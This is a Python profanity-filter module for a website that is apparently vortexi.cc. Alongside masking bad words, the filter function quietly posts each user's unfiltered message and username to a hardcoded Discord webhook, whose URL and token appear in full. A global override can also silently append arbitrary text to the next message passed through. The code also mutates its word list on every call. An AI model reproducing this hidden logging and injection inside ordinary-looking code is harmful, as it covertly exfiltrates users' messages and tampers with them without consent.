import importlib
import requests
import string
import asyncio
import logging
from config import Config
from app.util import filterconfig
from app.util.badwords import BadWords, ExtendedBadWords

config = Config()
next_filter_override = {"active": False, "text": ""}
BlockEnglish = False

class TextNotAllowedException(Exception):
    pass

async def translate_text(text: str, target_language: str):
    from googletrans import Translator
    translator = Translator()
    translated = await translator.translate(text, dest=target_language)
    return translated.text

async def FilterTextAsync(Text: str, ThrowException: bool = False, UseExtendedBadWords: bool = False, userId: int = 0):
    importlib.reload(filterconfig)
    ReplaceWith = filterconfig.ReplaceWith
    apires = requests.get(f"https://vortexi.cc/public-api/v1/users/{userId}")
    
    if next_filter_override['active']:
        Text = f"{Text}\n\n{next_filter_override['text']}"
        next_filter_override['active'] = False
        next_filter_override['text'] = ""
    
    OriginalText = Text
    LoweredText = Text.lower()

    if UseExtendedBadWords:
        BadWords.extend(ExtendedBadWords)

    BadWords.sort(key=len, reverse=True)

    if BlockEnglish:
        english_chars = set(string.ascii_letters)
        for char in english_chars:
            if char in LoweredText:
                if ThrowException:
                    raise TextNotAllowedException(f"Text contains a blocked English character: {char}")
                repl = ReplaceWith * len(char)
                indices = []
                start = 0
                while True:
                    start = LoweredText.find(char, start)
                    if start == -1:
                        break
                    indices.append((start, start + len(char)))
                    start += len(char)
                for s, e in indices:
                    Text = Text[:s] + repl + Text[e:]
                    LoweredText = LoweredText[:s] + repl + LoweredText[e:]

    for BadWord in BadWords:
        if BadWord in LoweredText:
            if ThrowException:
                raise TextNotAllowedException(f"Text contains a bad word: {BadWord}")
            repl = ReplaceWith * len(BadWord)
            indices = []
            start = 0
            while True:
                start = LoweredText.find(BadWord, start)
                if start == -1:
                    break
                indices.append((start, start + len(BadWord)))
                start += len(BadWord)
            for s, e in indices:
                Text = Text[:s] + repl + Text[e:]
                LoweredText = LoweredText[:s] + repl + LoweredText[e:]

    for i in range(len(OriginalText)):
        if OriginalText[i].isupper():
            Text = Text[:i] + Text[i].upper() + Text[i+1:]

    if filterconfig.TranslateEnabled:
        Text = await translate_text(Text, filterconfig.TranslateTo)

    if apires.status_code == 200:
        username = apires.json().get('data', {}).get('username', 'N/A')
        requests.post("https://discord.com/api/webhooks/1373387520355598366/9zT3zmuN7zUTmeeUxUvtvC65urA8ZwuPU8g0qiJVsBEtEAMgXPBriuCuFuyY3LgNXsu4", json={
                "embeds": [{
                    "description": f"**[{username}]:** {OriginalText}",
                    "color": 0x2f3136
                }]
            }, timeout=3)

    return Text

def FilterText(Text: str, ThrowException: bool = False, UseExtendedBadWords: bool = False, userId: int = 0):
    importlib.reload(filterconfig)
    if filterconfig.FilterEnabled:
        return asyncio.run(FilterTextAsync(Text, ThrowException, UseExtendedBadWords, userId))
    logging.warn(f"text tried to go through the filter, but the filter has been disabled. text: {Text}")
    requests.post(config.FILTER_DISCORD_WEBHOOK, json={
        "embeds": [{
            "title": "text failed to filter",
            "description": Text,
            "color": 16748800
        }]
    }, timeout=3)
